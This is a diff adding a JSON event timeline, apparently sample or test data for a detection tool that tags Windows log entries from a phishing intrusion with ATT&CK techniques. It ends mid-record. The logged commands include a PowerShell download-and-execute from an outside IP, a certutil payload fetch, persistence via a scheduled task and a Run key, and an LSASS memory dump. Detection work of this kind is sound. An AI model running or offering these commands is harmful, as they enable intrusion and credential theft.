@@ -1,0 +1,1806 @@
+{
+  "timeline": [
+    {
+      "index": 0,
+      "ts": "2026-10-05T13:59:00",
+      "host": "GW-CHECK",
+      "user": "checker",
+      "process": "",
+      "parent_process": "",
+      "command_line": "GET /health",
+      "command_line_full": "GET /health",
+      "message": "GET /health 200",
+      "raw": {
+        "@timestamp": "2026-10-05T08:59:00Z",
+        "host.name": "GW-CHECK",
+        "user.name": "checker",
+        "winlog.channel": "nginx",
+        "event.code": "access",
+        "process.name": "",
+        "process.parent.name": "",
+        "process.command_line": "GET /health",
+        "source.ip": "172.16.9.9",
+        "destination.ip": "10.10.20.60",
+        "winlog.event_data.TargetUserName": "",
+        "message": "GET /health 200"
+      },
+      "techniques": [],
+      "primary_technique": null,
+      "primary_confidence": null,
+      "channel": "nginx",
+      "event_id": "access",
+      "source": "win_phishing.csv"
+    },
+    {
+      "index": 1,
+      "ts": "2026-10-05T14:01:12",
+      "host": "HR-PC01",
+      "user": "hr.olim",
+      "process": "WINWORD.EXE",
+      "parent_process": "explorer.exe",
+      "command_line": "C:\\Program Files\\Microsoft Office\\WINWORD.EXE /n rezyume.docm",
+      "command_line_full": "C:\\Program Files\\Microsoft Office\\WINWORD.EXE /n rezyume.docm",
+      "message": "Office document opened from email attachment",
+      "raw": {
+        "@timestamp": "2026-10-05T09:01:12Z",
+        "host.name": "HR-PC01",
+        "user.name": "hr.olim",
+        "winlog.channel": "Microsoft-Windows-Sysmon/Operational",
+        "event.code": "1",
+        "process.name": "WINWORD.EXE",
+        "process.parent.name": "explorer.exe",
+        "process.command_line": "C:\\Program Files\\Microsoft Office\\WINWORD.EXE /n rezyume.docm",
+        "source.ip": "",
+        "destination.ip": "",
+        "winlog.event_data.TargetUserName": "",
+        "message": "Office document opened from email attachment"
+      },
+      "techniques": [
+        {
+          "technique": "T1566.001",
+          "name": "Spearphishing Attachment",
+          "confidence": "high",
+          "score": 1.0,
+          "source": "heuristic",
+          "evidence": "KB search match on: C:\\Program Files\\Microsoft Office\\WINWORD.EXE /n r..."
+        },
+        {
+          "technique": "T1059.005",
+          "name": "Visual Basic",
+          "confidence": "high",
+          "score": 1.0,
+          "source": "heuristic",
+          "evidence": "KB search match on: C:\\Program Files\\Microsoft Office\\WINWORD.EXE /n r..."
+        }
+      ],
+      "primary_technique": "T1566.001",
+      "primary_confidence": "high",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "event_id": "1",
+      "source": "win_phishing.csv"
+    },
+    {
+      "index": 2,
+      "ts": "2026-10-05T14:01:44",
+      "host": "HR-PC01",
+      "user": "hr.olim",
+      "process": "powershell.exe",
+      "parent_process": "WINWORD.EXE",
+      "command_line": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
+      "command_line_full": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
+      "message": "macro spawned powershell encoded",
+      "raw": {
+        "@timestamp": "2026-10-05T09:01:44Z",
+        "host.name": "HR-PC01",
+        "user.name": "hr.olim",
+        "winlog.channel": "Microsoft-Windows-Sysmon/Operational",
+        "event.code": "1",
+        "process.name": "powershell.exe",
+        "process.parent.name": "WINWORD.EXE",
+        "process.command_line": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
+        "source.ip": "",
+        "destination.ip": "",
+        "winlog.event_data.TargetUserName": "",
+        "message": "macro spawned powershell encoded"
+      },
+      "techniques": [
+        {
+          "technique": "T1059.001",
+          "name": "PowerShell",
+          "confidence": "high",
+          "score": 1.0,
+          "source": "heuristic",
+          "evidence": "KB search match on: powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4..."
+        },
+        {
+          "technique": "T1027",
+          "name": "Obfuscated Files or Information",
+          "confidence": "high",
+          "score": 1.0,
+          "source": "heuristic",
+          "evidence": "KB search match on: powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4..."
+        }
+      ],
+      "primary_technique": "T1059.001",
+      "primary_confidence": "high",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "event_id": "1",
+      "source": "win_phishing.csv"
+    },
+    {
+      "index": 3,
+      "ts": "2026-10-05T14:01:59",
+      "host": "HR-PC01",
+      "user": "hr.olim",
+      "process": "powershell.exe",
+      "parent_process": "",
+      "command_line": "IEX (New-Object Net.WebClient).DownloadString('http://45.142.212.61/a.ps1')",
+      "command_line_full": "IEX (New-Object Net.WebClient).DownloadString('http://45.142.212.61/a.ps1')",
+      "message": "scriptblock logging",
+      "raw": {
+        "@timestamp": "2026-10-05T09:01:59Z",
+        "host.name": "HR-PC01",
+        "user.name": "hr.olim",
+        "winlog.channel": "Microsoft-Windows-PowerShell/Operational",
+        "event.code": "4104",
+        "process.name": "powershell.exe",
+        "process.parent.name": "",
+        "process.command_line": "IEX (New-Object Net.WebClient).DownloadString('http://45.142.212.61/a.ps1')",
+        "source.ip": "",
+        "destination.ip": "",
+        "winlog.event_data.TargetUserName": "",
+        "message": "scriptblock logging"
+      },
+      "techniques": [
+        {
+          "technique": "T1059.001",
+          "name": "PowerShell",
+          "confidence": "high",
+          "score": 1.0,
+          "source": "heuristic",
+          "evidence": "KB search match on: IEX (New-Object Net.WebClient).DownloadString('htt..."
+        }
+      ],
+      "primary_technique": "T1059.001",
+      "primary_confidence": "high",
+      "channel": "Microsoft-Windows-PowerShell/Operational",
+      "event_id": "4104",
+      "source": "win_phishing.csv"
+    },
+    {
+      "index": 4,
+      "ts": "2026-10-05T14:02:20",
+      "host": "HR-PC01",
+      "user": "hr.olim",
+      "process": "certutil.exe",
+      "parent_process": "powershell.exe",
+      "command_line": "certutil.exe -urlcache -split -f http://45.142.212.61/beacon.exe C:\\Users\\hr.olim\\AppData\\Local\\Temp...",
+      "command_line_full": "certutil.exe -urlcache -split -f http://45.142.212.61/beacon.exe C:\\Users\\hr.olim\\AppData\\Local\\Temp\\beacon.exe",
+      "message": "download tool",
+      "raw": {
+        "@timestamp": "2026-10-05T09:02:20Z",
+        "host.name": "HR-PC01",
+        "user.name": "hr.olim",
+        "winlog.channel": "Microsoft-Windows-Sysmon/Operational",
+        "event.code": "1",
+        "process.name": "certutil.exe",
+        "process.parent.name": "powershell.exe",
+        "process.command_line": "certutil.exe -urlcache -split -f http://45.142.212.61/beacon.exe C:\\Users\\hr.olim\\AppData\\Local\\Temp\\beacon.exe",
+        "source.ip": "",
+        "destination.ip": "",
+        "winlog.event_data.TargetUserName": "",
+        "message": "download tool"
+      },
+      "techniques": [
+        {
+          "technique": "T1105",
+          "name": "Ingress Tool Transfer",
+          "confidence": "high",
+          "score": 1.0,
+          "source": "heuristic",
+          "evidence": "KB search match on: certutil.exe -urlcache -split -f http://45.142.212..."
+        }
+      ],
+      "primary_technique": "T1105",
+      "primary_confidence": "high",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "event_id": "1",
+      "source": "win_phishing.csv"
+    },
+    {
+      "index": 5,
+      "ts": "2026-10-05T14:02:35",
+      "host": "HR-PC01",
+      "user": "hr.olim",
+      "process": "beacon.exe",
+      "parent_process": "powershell.exe",
+      "command_line": "beacon.exe",
+      "command_line_full": "beacon.exe",
+      "message": "network connection to C2",
+      "raw": {
+        "@timestamp": "2026-10-05T09:02:35Z",
+        "host.name": "HR-PC01",
+        "user.name": "hr.olim",
+        "winlog.channel": "Microsoft-Windows-Sysmon/Operational",
+        "event.code": "3",
+        "process.name": "beacon.exe",
+        "process.parent.name": "powershell.exe",
+        "process.command_line": "beacon.exe",
+        "source.ip": "10.10.20.51",
+        "destination.ip": "45.142.212.61",
+        "winlog.event_data.TargetUserName": "",
+        "message": "network connection to C2"
+      },
+      "techniques": [
+        {
+          "technique": "T1071",
+          "name": "Application Layer Protocol",
+          "confidence": "low",
+          "score": 1.0,
+          "source": "eventmap",
+          "evidence": "Matched Sysmon event 3"
+        }
+      ],
+      "primary_technique": "T1071",
+      "primary_confidence": "low",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "event_id": "3",
+      "source": "win_phishing.csv"
+    },
+    {
+      "index": 6,
+      "ts": "2026-10-05T14:04:00",
+      "host": "GW-CHECK",
+      "user": "checker",
+      "process": "",
+      "parent_process": "",
+      "command_line": "GET /health",
+      "command_line_full": "GET /health",
+      "message": "GET /health 200",
+      "raw": {
+        "@timestamp": "2026-10-05T09:04:00Z",
+        "host.name": "GW-CHECK",
+        "user.name": "checker",
+        "winlog.channel": "nginx",
+        "event.code": "access",
+        "process.name": "",
+        "process.parent.name": "",
+        "process.command_line": "GET /health",
+        "source.ip": "172.16.9.9",
+        "destination.ip": "10.10.20.60",
+        "winlog.event_data.TargetUserName": "",
+        "message": "GET /health 200"
+      },
+      "techniques": [],
+      "primary_technique": null,
+      "primary_confidence": null,
+      "channel": "nginx",
+      "event_id": "access",
+      "source": "win_phishing.csv"
+    },
+    {
+      "index": 7,
+      "ts": "2026-10-05T14:05:00",
+      "host": "HR-PC01",
+      "user": "hr.olim",
+      "process": "beacon.exe",
+      "parent_process": "",
+      "command_line": "beacon.exe",
+      "command_line_full": "beacon.exe",
+      "message": "beacon check-in",
+      "raw": {
+        "@timestamp": "2026-10-05T09:05:00Z",
+        "host.name": "HR-PC01",
+        "user.name": "hr.olim",
+        "winlog.channel": "Microsoft-Windows-Sysmon/Operational",
+        "event.code": "3",
+        "process.name": "beacon.exe",
+        "process.parent.name": "",
+        "process.command_line": "beacon.exe",
+        "source.ip": "10.10.20.51",
+        "destination.ip": "45.142.212.61",
+        "winlog.event_data.TargetUserName": "",
+        "message": "beacon check-in"
+      },
+      "techniques": [
+        {
+          "technique": "T1071",
+          "name": "Application Layer Protocol",
+          "confidence": "low",
+          "score": 1.0,
+          "source": "eventmap",
+          "evidence": "Matched Sysmon event 3"
+        }
+      ],
+      "primary_technique": "T1071",
+      "primary_confidence": "low",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "event_id": "3",
+      "source": "win_phishing.csv"
+    },
+    {
+      "index": 8,
+      "ts": "2026-10-05T14:07:10",
+      "host": "HR-PC01",
+      "user": "hr.olim",
+      "process": "schtasks.exe",
+      "parent_process": "beacon.exe",
+      "command_line": "schtasks /create /sc onlogon /tn Updater /tr C:\\Users\\hr.olim\\AppData\\Local\\Temp\\beacon.exe",
+      "command_line_full": "schtasks /create /sc onlogon /tn Updater /tr C:\\Users\\hr.olim\\AppData\\Local\\Temp\\beacon.exe",
+      "message": "persistence scheduled task",
+      "raw": {
+        "@timestamp": "2026-10-05T09:07:10Z",
+        "host.name": "HR-PC01",
+        "user.name": "hr.olim",
+        "winlog.channel": "Microsoft-Windows-Sysmon/Operational",
+        "event.code": "1",
+        "process.name": "schtasks.exe",
+        "process.parent.name": "beacon.exe",
+        "process.command_line": "schtasks /create /sc onlogon /tn Updater /tr C:\\Users\\hr.olim\\AppData\\Local\\Temp\\beacon.exe",
+        "source.ip": "",
+        "destination.ip": "",
+        "winlog.event_data.TargetUserName": "",
+        "message": "persistence scheduled task"
+      },
+      "techniques": [
+        {
+          "technique": "T1053.005",
+          "name": "Scheduled Task",
+          "confidence": "high",
+          "score": 1.0,
+          "source": "heuristic",
+          "evidence": "KB search match on: schtasks /create /sc onlogon /tn Updater /tr C:\\Us..."
+        }
+      ],
+      "primary_technique": "T1053.005",
+      "primary_confidence": "high",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "event_id": "1",
+      "source": "win_phishing.csv"
+    },
+    {
+      "index": 9,
+      "ts": "2026-10-05T14:07:40",
+      "host": "HR-PC01",
+      "user": "hr.olim",
+      "process": "reg.exe",
+      "parent_process": "beacon.exe",
+      "command_line": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d C:\\Users\\hr.olim\\...",
+      "command_line_full": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d C:\\Users\\hr.olim\\AppData\\Local\\Temp\\beacon.exe /f",
+      "message": "run key persistence",
+      "raw": {
+        "@timestamp": "2026-10-05T09:07:40Z",
+        "host.name": "HR-PC01",
+        "user.name": "hr.olim",
+        "winlog.channel": "Microsoft-Windows-Sysmon/Operational",
+        "event.code": "13",
+        "process.name": "reg.exe",
+        "process.parent.name": "beacon.exe",
+        "process.command_line": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d C:\\Users\\hr.olim\\AppData\\Local\\Temp\\beacon.exe /f",
+        "source.ip": "",
+        "destination.ip": "",
+        "winlog.event_data.TargetUserName": "",
+        "message": "run key persistence"
+      },
+      "techniques": [
+        {
+          "technique": "T1112",
+          "name": "Modify Registry",
+          "confidence": "medium",
+          "score": 1.0,
+          "source": "eventmap",
+          "evidence": "Matched Sysmon event 13"
+        },
+        {
+          "technique": "T1547.001",
+          "name": "Registry Run Keys / Startup Folder",
+          "confidence": "high",
+          "score": 1.0,
+          "source": "heuristic",
+          "evidence": "KB search match on: reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVer..."
+        }
+      ],
+      "primary_technique": "T1547.001",
+      "primary_confidence": "high",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "event_id": "13",
+      "source": "win_phishing.csv"
+    },
+    {
+      "index": 10,
+      "ts": "2026-10-05T14:09:00",
+      "host": "GW-CHECK",
+      "user": "checker",
+      "process": "",
+      "parent_process": "",
+      "command_line": "GET /health",
+      "command_line_full": "GET /health",
+      "message": "GET /health 200",
+      "raw": {
+        "@timestamp": "2026-10-05T09:09:00Z",
+        "host.name": "GW-CHECK",
+        "user.name": "checker",
+        "winlog.channel": "nginx",
+        "event.code": "access",
+        "process.name": "",
+        "process.parent.name": "",
+        "process.command_line": "GET /health",
+        "source.ip": "172.16.9.9",
+        "destination.ip": "10.10.20.60",
+        "winlog.event_data.TargetUserName": "",
+        "message": "GET /health 200"
+      },
+      "techniques": [],
+      "primary_technique": null,
+      "primary_confidence": null,
+      "channel": "nginx",
+      "event_id": "access",
+      "source": "win_phishing.csv"
+    },
+    {
+      "index": 11,
+      "ts": "2026-10-05T14:10:00",
+      "host": "HR-PC01",
+      "user": "hr.olim",
+      "process": "beacon.exe",
+      "parent_process": "",
+      "command_line": "beacon.exe",
+      "command_line_full": "beacon.exe",
+      "message": "beacon check-in",
+      "raw": {
+        "@timestamp": "2026-10-05T09:10:00Z",
+        "host.name": "HR-PC01",
+        "user.name": "hr.olim",
+        "winlog.channel": "Microsoft-Windows-Sysmon/Operational",
+        "event.code": "3",
+        "process.name": "beacon.exe",
+        "process.parent.name": "",
+        "process.command_line": "beacon.exe",
+        "source.ip": "10.10.20.51",
+        "destination.ip": "45.142.212.61",
+        "winlog.event_data.TargetUserName": "",
+        "message": "beacon check-in"
+      },
+      "techniques": [
+        {
+          "technique": "T1071",
+          "name": "Application Layer Protocol",
+          "confidence": "low",
+          "score": 1.0,
+          "source": "eventmap",
+          "evidence": "Matched Sysmon event 3"
+        }
+      ],
+      "primary_technique": "T1071",
+      "primary_confidence": "low",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "event_id": "3",
+      "source": "win_phishing.csv"
+    },
+    {
+      "index": 12,
+      "ts": "2026-10-05T14:12:03",
+      "host": "HR-PC01",
+      "user": "hr.olim",
+      "process": "net.exe",
+      "parent_process": "beacon.exe",
+      "command_line": "net view /domain",
+      "command_line_full": "net view /domain",
+      "message": "discovery",
+      "raw": {
+        "@timestamp": "2026-10-05T09:12:03Z",
+        "host.name": "HR-PC01",
+        "user.name": "hr.olim",
+        "winlog.channel": "Microsoft-Windows-Sysmon/Operational",
+        "event.code": "1",
+        "process.name": "net.exe",
+        "process.parent.name": "beacon.exe",
+        "process.command_line": "net view /domain",
+        "source.ip": "",
+        "destination.ip": "",
+        "winlog.event_data.TargetUserName": "",
+        "message": "discovery"
+      },
+      "techniques": [
+        {
+          "technique": "T1135",
+          "name": "Network Share Discovery",
+          "confidence": "high",
+          "score": 1.0,
+          "source": "heuristic",
+          "evidence": "KB search match on: net view /domain"
+        }
+      ],
+      "primary_technique": "T1135",
+      "primary_confidence": "high",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "event_id": "1",
+      "source": "win_phishing.csv"
+    },
+    {
+      "index": 13,
+      "ts": "2026-10-05T14:12:20",
+      "host": "HR-PC01",
+      "user": "hr.olim",
+      "process": "nltest.exe",
+      "parent_process": "beacon.exe",
+      "command_line": "nltest /dclist:corp.local",
+      "command_line_full": "nltest /dclist:corp.local",
+      "message": "domain controller discovery",
+      "raw": {
+        "@timestamp": "2026-10-05T09:12:20Z",
+        "host.name": "HR-PC01",
+        "user.name": "hr.olim",
+        "winlog.channel": "Microsoft-Windows-Sysmon/Operational",
+        "event.code": "1",
+        "process.name": "nltest.exe",
+        "process.parent.name": "beacon.exe",
+        "process.command_line": "nltest /dclist:corp.local",
+        "source.ip": "",
+        "destination.ip": "",
+        "winlog.event_data.TargetUserName": "",
+        "message": "domain controller discovery"
+      },
+      "techniques": [
+        {
+          "technique": "T1018",
+          "name": "Remote System Discovery",
+          "confidence": "high",
+          "score": 1.0,
+          "source": "heuristic",
+          "evidence": "KB search match on: nltest /dclist:corp.local"
+        }
+      ],
+      "primary_technique": "T1018",
+      "primary_confidence": "high",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "event_id": "1",
+      "source": "win_phishing.csv"
+    },
+    {
+      "index": 14,
+      "ts": "2026-10-05T14:12:41",
+      "host": "HR-PC01",
+      "user": "hr.olim",
+      "process": "net.exe",
+      "parent_process": "beacon.exe",
+      "command_line": "net group \"Domain Admins\" /domain",
+      "command_line_full": "net group \"Domain Admins\" /domain",
+      "message": "privileged account discovery",
+      "raw": {
+        "@timestamp": "2026-10-05T09:12:41Z",
+        "host.name": "HR-PC01",
+        "user.name": "hr.olim",
+        "winlog.channel": "Microsoft-Windows-Sysmon/Operational",
+        "event.code": "1",
+        "process.name": "net.exe",
+        "process.parent.name": "beacon.exe",
+        "process.command_line": "net group \"Domain Admins\" /domain",
+        "source.ip": "",
+        "destination.ip": "",
+        "winlog.event_data.TargetUserName": "",
+        "message": "privileged account discovery"
+      },
+      "techniques": [
+        {
+          "technique": "T1069.002",
+          "name": "Domain Groups",
+          "confidence": "high",
+          "score": 1.0,
+          "source": "heuristic",
+          "evidence": "KB search match on: net group \"Domain Admins\" /domain"
+        }
+      ],
+      "primary_technique": "T1069.002",
+      "primary_confidence": "high",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "event_id": "1",
+      "source": "win_phishing.csv"
+    },
+    {
+      "index": 15,
+      "ts": "2026-10-05T14:14:00",
+      "host": "GW-CHECK",
+      "user": "checker",
+      "process": "",
+      "parent_process": "",
+      "command_line": "GET /health",
+      "command_line_full": "GET /health",
+      "message": "GET /health 200",
+      "raw": {
+        "@timestamp": "2026-10-05T09:14:00Z",
+        "host.name": "GW-CHECK",
+        "user.name": "checker",
+        "winlog.channel": "nginx",
+        "event.code": "access",
+        "process.name": "",
+        "process.parent.name": "",
+        "process.command_line": "GET /health",
+        "source.ip": "172.16.9.9",
+        "destination.ip": "10.10.20.60",
+        "winlog.event_data.TargetUserName": "",
+        "message": "GET /health 200"
+      },
+      "techniques": [],
+      "primary_technique": null,
+      "primary_confidence": null,
+      "channel": "nginx",
+      "event_id": "access",
+      "source": "win_phishing.csv"
+    },
+    {
+      "index": 16,
+      "ts": "2026-10-05T14:14:05",
+      "host": "HR-PC01",
+      "user": "hr.olim",
+      "process": "lsass.exe",
+      "parent_process": "beacon.exe",
+      "command_line": "C:\\Windows\\System32\\rundll32.exe comsvcs.dll, MiniDump 720 C:\\Windows\\Temp\\lsass.dmp full",
+      "command_line_full": "C:\\Windows\\System32\\rundll32.exe comsvcs.dll, MiniDump 720 C:\\Windows\\Temp\\lsass.dmp full",
+      "message": "lsass memory access",
+      "raw": {
+        "@timestamp": "2026-10-05T09:14:05Z",
+        "host.name": "HR-PC01",
+        "user.name": "hr.olim",
+        "winlog.channel": "Microsoft-Windows-Sysmon/Operational",
+        "event.code": "10",
+        "process.name": "lsass.exe",
+        "process.parent.name": "beacon.exe",
+        "process.command_line": "C:\\Windows\\System32\\rundll32.exe comsvcs.dll, MiniDump 720 C:\\Windows\\Temp\\lsass.dmp full",
+        "source.ip": "",
+        "destination.ip": "",
+        "winlog.event_data.TargetUserName": "",
+        "message": "lsass memory access"
+      },
+      "techniques": [
+        {
+          "technique": "T1003.001",
+          "name": "LSASS Memory",
+          "confidence": "high",
+          "score": 1.0,
+          "source": "eventmap",
+          "evidence": "Matched Sysmon event 10"
+        }
+      ],
+      "primary_technique": "T1003.001",
+      "primary_confidence": "high",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "event_id": "10",
+      "source": "win_phishing.csv"
+    },
+    {
+      "index": 17,
+      "ts": "2026-10-05T14:15:00",
+      "host": "HR-PC01",
+      "user": "hr.olim",
+      "process": "beacon.exe",
+      "parent_process": "",
+      "command_line": "beacon.exe",
+      "command_line_full": "beacon.exe",
+      "message": "beacon check-in",
+      "raw": {
+        "@timestamp": "2026-10-05T09:15:00Z",
+        "host.name": "HR-PC01",
+        "user.name": "hr.olim",
+        "winlog.channel": "Microsoft-Windows-Sysmon/Operational",
+        "event.code": "3",
+        "process.name": "beacon.exe",
+        "process.parent.name": "",
+        "process.command_line": "beacon.exe",
+        "source.ip": "10.10.20.51",
+        "destination.ip": "45.142.212.61",
+        "winlog.event_data.TargetUserName": "",
+        "message": "beacon check-in"
+      },
+      "techniques": [
+        {
+          "technique": "T1071",
+          "name": "Application Layer Protocol",
+          "confidence": "low",
+          "score": 1.0,
+          "source": "eventmap",
+          "evidence": "Matched Sysmon event 3"
+        }
+      ],
+      "primary_technique": "T1071",
+      "primary_confidence": "low",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "event_id": "3",
+      "source": "win_phishing.csv"
+    },
+    {
+      "index": 18,
+      "ts": "2026-10-05T14:19:00",
+      "host": "GW-CHECK",
+      "user": "checker",
+      "process": "",
+      "parent_process": "",
+      "command_line": "GET /health",
+      "command_line_full": "GET /health",
+      "message": "GET /health 200",
+      "raw": {
+        "@timestamp": "2026-10-05T09:19:00Z",
+        "host.name": "GW-CHECK",
+        "user.name": "checker",
+        "winlog.channel": "nginx",
+        "event.code": "access",
+        "process.name": "",
+        "process.parent.name": "",
+        "process.command_line": "GET /health",
+        "source.ip": "172.16.9.9",
+        "destination.ip": "10.10.20.60",
+        "winlog.event_data.TargetUserName": "",
+        "message": "GET /health 200"
+      },
+      "techniques": [],
+      "primary_technique": null,
+      "primary_confidence": null,
+      "channel": "nginx",
+      "event_id": "access",
+      "source": "win_phishing.csv"
+    },
+    {
+      "index": 19,
+      "ts": "2026-10-05T14:20:00",
+      "host": "HR-PC01",
+      "user": "hr.olim",
+      "process": "beacon.exe",
+      "parent_process": "",
+      "command_line": "beacon.exe",
+      "command_line_full": "beacon.exe",
+      "message": "beacon check-in",
+      "raw": {
+        "@timestamp": "2026-10-05T09:20:00Z",
+        "host.name": "HR-PC01",
+        "user.name": "hr.olim",
+        "winlog.channel": "Microsoft-Windows-Sysmon/Operational",
+        "event.code": "3",
+        "process.name": "beacon.exe",
+        "process.parent.name": "",
+        "process.command_line": "beacon.exe",
+        "source.ip": "10.10.20.51",
+        "destination.ip": "45.142.212.61",
+        "winlog.event_data.TargetUserName": "",
+        "message": "beacon check-in"
+      },
+      "techniques": [
+        {
+          "technique": "T1071",
+          "name": "Application Layer Protocol",
+          "confidence": "low",
+          "score": 1.0,
+          "source": "eventmap",
+          "evidence": "Matched Sysmon event 3"
+        }
+      ],
+      "primary_technique": "T1071",
+      "primary_confidence": "low",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "event_id": "3",
+      "source": "win_phishing.csv"
+    },
+    {
+      "index": 20,
+      "ts": "2026-10-05T14:20:11",
+      "host": "DC01",
+      "user": "SYSTEM",
+      "process": "",
+      "parent_process": "",
+      "command_line": "failed logon",
+      "command_line_full": "failed logon",
+      "message": "failed logon",
+      "raw": {
+        "@timestamp": "2026-10-05T09:20:11Z",
+        "host.name": "DC01",
+        "user.name": "SYSTEM",
+        "winlog.channel": "Security",
+        "event.code": "4625",
+        "process.name": "",
+        "process.parent.name": "",
+        "process.command_line": "",
+        "source.ip": "10.10.20.51",
+        "destination.ip": "",
+        "winlog.event_data.TargetUserName": "bux.aziza",
+        "message": "failed logon"
+      },
+      "techniques": [
+        {
+          "technique": "T1110",
+          "name": "Brute Force",
+          "confidence": "low",
+          "score": 1.0,
+          "source": "eventmap",
+          "evidence": "Matched Security event 4625"
+        }
+      ],
+      "primary_technique": "T1110",
+      "primary_confidence": "low",
+      "channel": "Security",
+      "event_id": "4625",
+      "source": "win_phishing.csv"
+    },
+    {
+      "index": 21,
+      "ts": "2026-10-05T14:20:22",
+      "host": "DC01",
+      "user": "SYSTEM",
+      "process": "",
+      "parent_process": "",
+      "command_line": "failed logon",
+      "command_line_full": "failed logon",
+      "message": "failed logon",
+      "raw": {
+        "@timestamp": "2026-10-05T09:20:22Z",
+        "host.name": "DC01",
+        "user.name": "SYSTEM",
+        "winlog.channel": "Security",
+        "event.code": "4625",
+        "process.name": "",
+        "process.parent.name": "",
+        "process.command_line": "",
+        "source.ip": "10.10.20.51",
+        "destination.ip": "",
+        "winlog.event_data.TargetUserName": "bux.aziza",
+        "message": "failed logon"
+      },
+      "techniques": [
+        {
+          "technique": "T1110",
+          "name": "Brute Force",
+          "confidence": "low",
+          "score": 1.0,
+          "source": "eventmap",
+          "evidence": "Matched Security event 4625"
+        }
+      ],
+      "primary_technique": "T1110",
+      "primary_confidence": "low",
+      "channel": "Security",
+      "event_id": "4625",
+      "source": "win_phishing.csv"
+    },
+    {
+      "index": 22,
+      "ts": "2026-10-05T14:20:33",
+      "host": "DC01",
+      "user": "SYSTEM",
+      "process": "",
+      "parent_process": "",
+      "command_line": "failed logon",
+      "command_line_full": "failed logon",
+      "message": "failed logon",
+      "raw": {
+        "@timestamp": "2026-10-05T09:20:33Z",
+        "host.name": "DC01",
+        "user.name": "SYSTEM",
+        "winlog.channel": "Security",
+        "event.code": "4625",
+        "process.name": "",
+        "process.parent.name": "",
+        "process.command_line": "",
+        "source.ip": "10.10.20.51",
+        "destination.ip": "",
+        "winlog.event_data.TargetUserName": "bux.aziza",
+        "message": "failed logon"
+      },
+      "techniques": [
+        {
+          "technique": "T1110",
+          "name": "Brute Force",
+          "confidence": "low",
+          "score": 1.0,
+          "source": "eventmap",
+          "evidence": "Matched Security event 4625"
+        }
+      ],
+      "primary_technique": "T1110",
+      "primary_confidence": "low",
+      "channel": "Security",
+      "event_id": "4625",
+      "source": "win_phishing.csv"
+    },
+    {
+      "index": 23,
+      "ts": "2026-10-05T14:20:44",
+      "host": "DC01",
+      "user": "SYSTEM",
+      "process": "",
+      "parent_process": "",
+      "command_line": "failed logon",
+      "command_line_full": "failed logon",
+      "message": "failed logon",
+      "raw": {
+        "@timestamp": "2026-10-05T09:20:44Z",
+        "host.name": "DC01",
+        "user.name": "SYSTEM",
+        "winlog.channel": "Security",
+        "event.code": "4625",
+        "process.name": "",
+        "process.parent.name": "",
+        "process.command_line": "",
+        "source.ip": "10.10.20.51",
+        "destination.ip": "",
+        "winlog.event_data.TargetUserName": "bux.aziza",
+        "message": "failed logon"
+      },
+      "techniques": [
+        {
+          "technique": "T1110",
+          "name": "Brute Force",
+          "confidence": "low",
+          "score": 1.0,
+          "source": "eventmap",
+          "evidence": "Matched Security event 4625"
+        }
+      ],
+      "primary_technique": "T1110",
+      "primary_confidence": "low",
+      "channel": "Security",
+      "event_id": "4625",
+      "source": "win_phishing.csv"
+    },
+    {
+      "index": 24,
+      "ts": "2026-10-05T14:20:55",
+      "host": "DC01",
+      "user": "SYSTEM",
+      "process": "",
+      "parent_process": "",
+      "command_line": "failed logon",
+      "command_line_full": "failed logon",
+      "message": "failed logon",
+      "raw": {
+        "@timestamp": "2026-10-05T09:20:55Z",
+        "host.name": "DC01",
+        "user.name": "SYSTEM",
+        "winlog.channel": "Security",
+        "event.code": "4625",
+        "process.name": "",
+        "process.parent.name": "",
+        "process.command_line": "",
+        "source.ip": "10.10.20.51",
+        "destination.ip": "",
+        "winlog.event_data.TargetUserName": "bux.aziza",
+        "message": "failed logon"
+      },
+      "techniques": [
+        {
+          "technique": "T1110",
+          "name": "Brute Force",
+          "confidence": "low",
+          "score": 1.0,
+          "source": "eventmap",
+          "evidence": "Matched Security event 4625"
+        }
+      ],
+      "primary_technique": "T1110",
+      "primary_confidence": "low",
+      "channel": "Security",
+      "event_id": "4625",
+      "source": "win_phishing.csv"
+    },
+    {
+      "index": 25,
+      "ts": "2026-10-05T14:21:06",
+      "host": "DC01",
+      "user": "SYSTEM",
+      "process": "",
+      "parent_process": "",
+      "command_line": "failed logon",
+      "command_line_full": "failed logon",
+      "message": "failed logon",
+      "raw": {
+        "@timestamp": "2026-10-05T09:21:06Z",
+        "host.name": "DC01",
+        "user.name": "SYSTEM",
+        "winlog.channel": "Security",
+        "event.code": "4625",
+        "process.name": "",
+        "process.parent.name": "",
+        "process.command_line": "",
+        "source.ip": "10.10.20.51",
+        "destination.ip": "",
+        "winlog.event_data.TargetUserName": "bux.aziza",
+        "message": "failed logon"
+      },
+      "techniques": [
+        {
+          "technique": "T1110",
+          "name": "Brute Force",
+          "confidence": "low",
+          "score": 1.0,
+          "source": "eventmap",
+          "evidence": "Matched Security event 4625"
+        }
+      ],
+      "primary_technique": "T1110",
+      "primary_confidence": "low",
+      "channel": "Security",
+      "event_id": "4625",
+      "source": "win_phishing.csv"
+    },
+    {
+      "index": 26,
